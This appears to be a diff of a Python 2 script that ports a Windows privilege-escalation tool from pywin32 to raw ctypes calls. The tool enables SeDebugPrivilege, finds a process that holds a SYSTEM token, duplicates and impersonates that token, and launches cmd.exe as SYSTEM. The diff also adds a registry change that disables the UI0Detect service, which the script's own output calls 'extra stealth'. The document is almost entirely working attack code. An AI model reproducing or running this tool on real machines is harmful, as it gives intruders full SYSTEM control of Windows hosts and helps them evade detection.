@@ -1,128 +1,258 @@
-import win32api, win32pdh, win32process, win32security, win32con, win32profile
-import pywintypes
-import win32com.shell.shell as shell
 import sys
+from _winreg import *
+from ctypes import *
 
-if not shell.IsUserAnAdmin():
+if not windll.Shell32.IsUserAnAdmin():
     print "[!] This script should be run as admin!"
     print "[!] Exiting."
     sys.exit()
 
-def EnablePrivilege(privilegeStr, token = None):
+LPVOID = c_void_p
+PVOID = LPVOID
+PSID = PVOID
+DWORD = c_uint32
+LPSTR = c_char_p
+HANDLE      = LPVOID
+INVALID_HANDLE_VALUE = c_void_p(-1).value
+LONG        = c_long
+WORD        = c_uint16
+
+READ_CONTROL                     = 0x00020000L
+STANDARD_RIGHTS_READ             = READ_CONTROL
+STANDARD_RIGHTS_REQUIRED         = 0x000F0000L
+
+TOKEN_ASSIGN_PRIMARY    = 0x0001
+TOKEN_DUPLICATE         = 0x0002
+TOKEN_IMPERSONATE       = 0x0004
+TOKEN_QUERY             = 0x0008
+TOKEN_QUERY_SOURCE      = 0x0010
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_ADJUST_GROUPS     = 0x0040
+TOKEN_ADJUST_DEFAULT    = 0x0080
+TOKEN_ADJUST_SESSIONID  = 0x0100
+TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
+tokenprivs  = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072L | 4))
+TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+        TOKEN_ADJUST_SESSIONID)
+
+class LUID(Structure):
+    _fields_ = [
+        ("LowPart",     DWORD),
+        ("HighPart",    LONG),
+    ]
+
+
+class SID_AND_ATTRIBUTES(Structure):
+    _fields_ = [
+        ("Sid",         PSID),
+        ("Attributes",  DWORD),
+    ]
+
+class TOKEN_USER(Structure):
+    _fields_ = [
+        ("User", SID_AND_ATTRIBUTES),]
+
+class LUID_AND_ATTRIBUTES(Structure):
+    _fields_ = [
+        ("Luid",        LUID),
+        ("Attributes",  DWORD),
+    ]
+
+class TOKEN_PRIVILEGES(Structure):
+    _fields_ = [
+        ("PrivilegeCount",  DWORD),
+        ("Privileges",      LUID_AND_ATTRIBUTES),
+    ]
+
+class PROCESS_INFORMATION(Structure):
+    _fields_ = [
+        ('hProcess',    HANDLE),
+        ('hThread',     HANDLE),
+        ('dwProcessId', DWORD),
+        ('dwThreadId',  DWORD),
+    ]
+
+class STARTUPINFO(Structure):
+    _fields_ = [
+        ('cb',              DWORD),
+        ('lpReserved',      LPSTR),
+        ('lpDesktop',       LPSTR),
+        ('lpTitle',         LPSTR),
+        ('dwX',             DWORD),
+        ('dwY',             DWORD),
+        ('dwXSize',         DWORD),
+        ('dwYSize',         DWORD),
+        ('dwXCountChars',   DWORD),
+        ('dwYCountChars',   DWORD),
+        ('dwFillAttribute', DWORD),
+        ('dwFlags',         DWORD),
+        ('wShowWindow',     WORD),
+        ('cbReserved2',     WORD),
+        ('lpReserved2',     LPVOID),    # LPBYTE
+        ('hStdInput',       HANDLE),
+        ('hStdOutput',      HANDLE),
+        ('hStdError',       HANDLE),
+    ]
+
+def GetUserName():
+    nSize = DWORD(0)
+    windll.advapi32.GetUserNameA(None, byref(nSize))
+    error = GetLastError()
+    
+    ERROR_INSUFFICIENT_BUFFER = 122
+    if error != ERROR_INSUFFICIENT_BUFFER:
+        raise WinError(error)
+    
+    lpBuffer = create_string_buffer('', nSize.value + 1)
+    
+    success = windll.advapi32.GetUserNameA(lpBuffer, byref(nSize))
+    if not success:
+        raise WinError()
+    return lpBuffer.value
+
+def GetTokenSid(hToken):
+    """Retrieve SID from Token"""
+    dwSize = DWORD(0)
+    pStringSid = LPSTR()
+    
+    TokenUser = 1
+    windll.advapi32.GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize)) #geeft 0
+                                
+    address = windll.kernel32.LocalAlloc(0x0040, dwSize)
+    
+    windll.advapi32.GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))
+
+    pToken_User = cast(address, POINTER(TOKEN_USER))
+
+    windll.advapi32.ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
+    sid = pStringSid.value
+    
+    windll.kernel32.LocalFree(address)
+    return sid
+
+def EnablePrivilege(privilegeStr, hToken = None):
     """Enable Privilege on token, if no token is given the function gets the token of the current process."""
-    if token == None:
-        token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
+    if hToken == None:
+        TOKEN_ADJUST_PRIVILEGES = 0x00000020
+        TOKEN_QUERY = 0x0008
+        hToken = HANDLE(INVALID_HANDLE_VALUE)
+        windll.advapi32.OpenProcessToken(windll.kernel32.GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken) )
+    
+    privilege_id = LUID()
+    windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))
 
-    privilege_id = win32security.LookupPrivilegeValue(None, privilegeStr)
-    old_privs = win32security.AdjustTokenPrivileges(token, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])
-
+    SE_PRIVILEGE_ENABLED = 0x00000002
+    laa = LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
+    tp  = TOKEN_PRIVILEGES(1, laa)
+    
+    windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
 
 def procids():
-    """Returns a list with all running processes and their pids."""
-    junk, instances = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
-    proc_ids=[]
-    proc_dict={}
-
-    for instance in instances:
-        if instance in proc_dict:
-            proc_dict[instance] += 1
-        else:
-            proc_dict[instance] = 0
-
-    for instance, max_instances in proc_dict.items():
-        for inum in xrange(max_instances+1):
-            hq = win32pdh.OpenQuery()
-            path = win32pdh.MakeCounterPath( (None,'process',instance, None, inum,'ID Process') )
-            counter_handle=win32pdh.AddCounter(hq, path) 
-            win32pdh.CollectQueryData(hq)
-            type, val = win32pdh.GetFormattedCounterValue(counter_handle, win32pdh.PDH_FMT_LONG)
-            proc_ids.append((instance,str(val)))
-            win32pdh.CloseQuery(hq) 
- 
-    return [int(pid[1]) for pid in proc_ids]
+    size            = 0x1000
+    cbBytesReturned = DWORD()
+    unit = sizeof(DWORD)
+    while 1:
+        ProcessIds = (DWORD * (size // unit))()
+        cbBytesReturned.value = size
+        windll.psapi.EnumProcesses(byref(ProcessIds), cbBytesReturned, byref(cbBytesReturned))
+        if cbBytesReturned.value < size:
+            break
+        size = size + 0x1000
+    
+    ProcessIdList = []
+    for ProcessId in ProcessIds:
+        if ProcessId is None:
+            break
+        ProcessIdList.append(ProcessId)
+    return ProcessIdList
 
 def GetLocalSystemProcessToken():
-    """Takes a list of pids and checks if the process has a token with SYSTEM user, if so it returns the token handle."""
-    
-    tokenprivs = (win32con.TOKEN_QUERY | win32con.TOKEN_READ | win32con.TOKEN_IMPERSONATE | win32con.TOKEN_QUERY_SOURCE | win32con.TOKEN_DUPLICATE | win32con.TOKEN_ASSIGN_PRIMARY | win32con.TOKEN_EXECUTE)
-    pids = [pid for pid in sorted(win32process.EnumProcesses(), reverse = True) if pid]
+    """Takes a list of pids and checks if the process has a token with SYSTEM user, if so it returns the token handle."""    
+    pids = [pid for pid in sorted(procids()) if pid != 0]
+
     for pid in pids:
         try:
-            PyhProcess = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)
-            PyhToken = win32security.OpenProcessToken(PyhProcess, tokenprivs)
-##Get the token SID.
-            sid = win32security.ConvertSidToStringSid(win32security.GetTokenInformation(PyhToken, win32security.TokenUser)[0])
+            PROCESS_QUERY_INFORMATION = 0x0400
+            hProcess = windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
+
+            hToken = HANDLE(INVALID_HANDLE_VALUE)
+            windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))
 
 ##If token SID is the SID of SYSTEM, return the token handle.
-            if sid == "S-1-5-18":
-                print "[+] Using PID: " + str(pid)
-                win32api.CloseHandle(PyhProcess)
-                return PyhToken
-            win32api.CloseHandle(PyhToken)
-            win32api.CloseHandle(PyhProcess)
+            if GetTokenSid(hToken) == "S-1-5-18":
+                print "\t[+] Using PID: " + str(pid)
+                windll.kernel32.CloseHandle(hProcess)
+                return hToken
+            windll.kernel32.CloseHandle(hToken)
+            windll.kernel32.CloseHandle(hProcess)
 
-        except pywintypes.error,e :
-            print "[!] Error: " + str(e[2]) + " With PID: " + str(pid)
+        except WindowsError, e :
+            print "[!] Error:" + str(e)
 
 
 ##Enable SE_DEBUG_NAME(debugprivileges) on the current process.
 print "[+] Enabling SE_DEBUG_NAME"
-EnablePrivilege(win32security.SE_DEBUG_NAME)
+EnablePrivilege("SeDebugPrivilege")
 
 ##Get a SYSTEM user token.
 print "[+] Retrieving SYSTEM token"
-PyhToken = GetLocalSystemProcessToken()
+hToken = GetLocalSystemProcessToken()
 
 ##Duplicate it to a Primary Token, so it can be passed to CreateProcess.
 print "[+] Duplicating token"
-PyhTokendupe = win32security.DuplicateTokenEx(
-                                            PyhToken,
-                                            win32security.SecurityImpersonation,
-                                            win32con.MAXIMUM_ALLOWED,
-                                            win32security.TokenPrimary,
-                                            TokenAttributes = None)
+hTokendupe = HANDLE(INVALID_HANDLE_VALUE)
+
+SecurityImpersonation   = 2
+TokenPrimary        = 1
+windll.advapi32.DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, 1, byref(hTokendupe))
+
 ##Now we have duplicated the token, we can close the orginal.
-win32api.CloseHandle(PyhToken)
+windll.kernel32.CloseHandle(hToken)
 
 ##Enable SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME, these are both needed to start a process with a token.
 print "[+] Enabling SE_ASSIGNPRIMARYTOKEN_NAME"
-EnablePrivilege(win32security.SE_ASSIGNPRIMARYTOKEN_NAME, token = PyhTokendupe)
+EnablePrivilege("SeAssignPrimaryTokenPrivilege", hToken = hTokendupe)
 
 print "[+] Enabling SE_INCREASE_QUOTA_NAME"
-EnablePrivilege(win32security.SE_INCREASE_QUOTA_NAME, token = PyhTokendupe)
+EnablePrivilege("SeIncreaseQuotaPrivilege", hToken = hTokendupe)
 
 ##Enable SE_IMPERSONATE_NAME, so that we can impersonate the SYSTEM token.
 print "[+] Enabling SE_IMPERSONATE_NAME"
-EnablePrivilege(win32security.SE_IMPERSONATE_NAME)
+EnablePrivilege("SeImpersonatePrivilege")
 
 print "[+] Impersonating token"
-win32security.ImpersonateLoggedOnUser(PyhTokendupe)
-print "[+] Running as: " + win32api.GetUserName()
+windll.advapi32.ImpersonateLoggedOnUser(hTokendupe)
+print "[+] Running as: " + GetUserName()
+
+print "[+] Changing HKLM\SYSTEM\CurrentControlSet\services\UI0Detect start for some extra stealth"
+with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\services\UI0Detect", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
+        value = QueryValueEx(key, "Start")[0]
+        SetValueEx(key, "Start" , 0, REG_DWORD, 4)
 
 ##Start the process with the token.
 try:
     print "[+] Starting shell as SYSTEM"
-    pi =  win32process.CreateProcessAsUser(
-                                            PyhTokendupe,
-                                            r"C:\Windows\System32\cmd.exe",
-                                            None,
-                                            None,
-                                            None,
-                                            True,
-                                            win32process.CREATE_NEW_CONSOLE,
-                                            None,
-                                            None,
-                                            win32process.STARTUPINFO())
-    print "\t[+]PID: " + str(pi[2])
-except pywintypes.error,e :
-    print "[!] Error:" + str(e[2])
+    lpProcessInformation = PROCESS_INFORMATION()
+    lpStartupInfo = STARTUPINFO()
+    CREATE_NEW_CONSOLE                = 0x00000010
+    
+    windll.advapi32.CreateProcessAsUserA(hTokendupe, r"C:\Windows\System32\cmd.exe", None, None, None, True, CREATE_NEW_CONSOLE, None, None, byref(lpStartupInfo), byref(lpProcessInformation))
+    print "\t[+] PID: " + str(lpProcessInformation.dwProcessId)
+except WindowsError, e :
+    print "[!] Error:" + str(e)
 
 ##Clean up, revert back to self and close the 
 print "[+] Cleaning up: "
 
+print "\t[+] Changing HKLM\SYSTEM\CurrentControlSet\services\UI0Detect back"
+with OpenKey(HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\services\UI0Detect", 0, KEY_WOW64_64KEY + KEY_ALL_ACCESS) as key:
+        SetValueEx(key, "Start" , 0, REG_DWORD, value)
+
 print "\t[+] Reverting to self"
-win32security.RevertToSelf()
-print "\t[+] Running as: " + win32api.GetUserName()
+windll.advapi32.RevertToSelf()
+print "\t[+] Running as: " + GetUserName()
 
 print "\t[+] Closing Handle"
-win32api.CloseHandle(PyhTokendupe)
+windll.kernel32.CloseHandle(hTokendupe)
